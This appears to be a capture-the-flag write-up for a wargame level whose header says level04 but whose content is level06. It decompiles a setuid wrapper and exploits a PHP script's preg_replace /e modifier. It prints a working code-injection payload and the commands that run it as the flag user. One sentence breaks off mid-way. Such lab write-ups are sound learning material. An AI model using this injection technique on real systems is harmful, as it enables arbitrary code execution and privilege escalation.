# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2006(level06) gid=2006(level06) groups=2006(level06),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

## Solution

We found two suspicious files:
- `/home/user/level06/level06`, a binary file.
- `/home/user/level06/level06.php`, a php script.

### Privileges

We determined `/home/user/level06/level06` is a prime candidate for privilege escalation because:
- It is owned by `flag06` (our target).
- The group owner is `level06` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level06`, the privilege state is as follows:  
- Real UID: `level06`
- Real GUID: `level06`
- Effective UID: `flag06`
- Effective GUID: `level06`

### Languages

`/home/user/level06/level06` is a binary executable.
`/home/user/level06/level06.php` is a PHP script, an interpreted language.

PHP is installed in version **5.3.10**:
```sh
$ php --version
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54) 
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

### Script(s) behaviour(s)

**`/home/user/level06/level06`**:  

We use [Ghidra](https://github.com/nationalsecurityagency/ghidra) to deassemble and analyze it's content to an equivalent of **C** to understand it's behaviour.

```c
undefined4 main(undefined4 param_1,int param_2,char **param_3) {
  int iVar1;
  char **__envp;
  char *__ptr;
  __gid_t __rgid;
  __uid_t __ruid;
  char *local_34;
  char *local_30;
  char *local_2c;
  char *local_28;
  undefined4 local_24;
  undefined4 *local_18;
  
  __envp = param_3;
  iVar1 = param_2;
  local_18 = &param_1;
  __ptr = strdup("");
  local_28 = strdup("");
  if (*(int *)(iVar1 + 4) != 0) {
    free(__ptr);
    __ptr = strdup(*(char **)(iVar1 + 4));
    if (*(int *)(iVar1 + 8) != 0) {
      free(local_28);
      local_28 = strdup(*(char **)(iVar1 + 8));
    }
  }
  local_30 = "/home/user/level06/level06.php";
  local_24 = 0;
  local_2c = __ptr;
  execve("/usr/bin/php",&local_34,__envp);
  return 0;
}
```

It acts as a privileged wrapper to execute the `/home/user/level06/level06.php` PHP script.

**`/home/user/level06/level06.php`**:  

It is readable as is.  
We used a [web php beautifier](https://codebeautify.org/php-beautifier) as the source code is squashed and added comments to describe the behaviour of each line.
```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m); // Replaces any found '.' by ' x ' in the string '$m'.
    $m = preg_replace("/@/", " y", $m); // Replaces any found '@' by ' y' in the string '$m'
    return $m;
}

function x($y, $z)
{
    $a = file_get_contents($y); // Reads file '$y'
	// It matches strings of the form [x ...], where ... can be any sequence of characters.
	// For the rest of the explanation, ... refers to that captured sequence.
	// - Group 1 captures the full match: [x ...]
	// - Group 2 captures only the content inside after "x " (i.e., ...).
	// The replacement builds a string y("..."), which due to the /e modifier, is evaluated/interpreted as PHP code.
	// This also implies it will call the `y` function on our payload.
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); // Replaces any found '[' by '(' in the string '$a'
    $a = preg_replace("/\]/", ")", $a); // Replaces any found ']' by ')' in the string '$a'
    return $a;
}

$r = x($argv[1], $argv[2]); // Formats the first process parameter. The second argument is ignored.
print $r; // Prints the retuned formatted first process parameter.
?>
```

It reads the content of the specified file and executes multiple Regex obfuscation and replacement operations on it, before printing it back to STDOUT.

We notice the usage of `preg_replace`. It's usage with the `\e` modifier is discouraged and prevented in modern versions of PHP. It is a known vulnerability.

The `preg_replace` with usage of the `\e` modifier is known to be a vulnerability and it's usage is discouraged or prevented in modern versions of PHP.

**Vulnerability**

`/home/user/level06/level06.php` uses the `preg_replace` function with the `\e` (execute) modifier.  
In modern versions of PHP, it is [discouraged or prevented](https://www.php.net/manual/en/function.preg-replace.php) because it is [known to](https://stackoverflow.com/questions/38039318/e-modifier-is-deprecated) easily introduce **Arbitrary Code Execution (ACE)** opportunities.

The script reads raw input from a user-provided file and passes it through `preg_replace()` with the `/e` (execute) modifier. Because the regular expression captures user-controlled content and evaluates it as PHP code, the script **is susceptible to ACE**.

Although the injected payload is constrained within a `y("...")` function call and wrapped in double quotes, we can bypass this boundary using string interpolation by leveraging PHP's `${...}` and `{$...}` syntax. It would force the interpreter to resolve our payload and execute the contained expression before the `y()` function is ever invoked. It also means we cannot use double-quotes ourselves to not break the 

We would like to pass the following payload: `[x ${`getflag > /tmp/checkflag`}]`.  
1. The backsticks (**\`\`**) act as a shell execution operator. PHP spawns a process to execute the contained command immediately.
2. The curley braces (**${}**) trigger variable interpolation within the context of a double-quoted string. This forces the evaluation of the internal expression before the resolution of the surrounding string.

```sh
$ echo '[x ${`getflag > /tmp/checkflag`}]' > /tmp/exploit
$ /home/user/level06/level06 /tmp/exploit
$ cat /tmp/checkflag
```

And there is the flag !
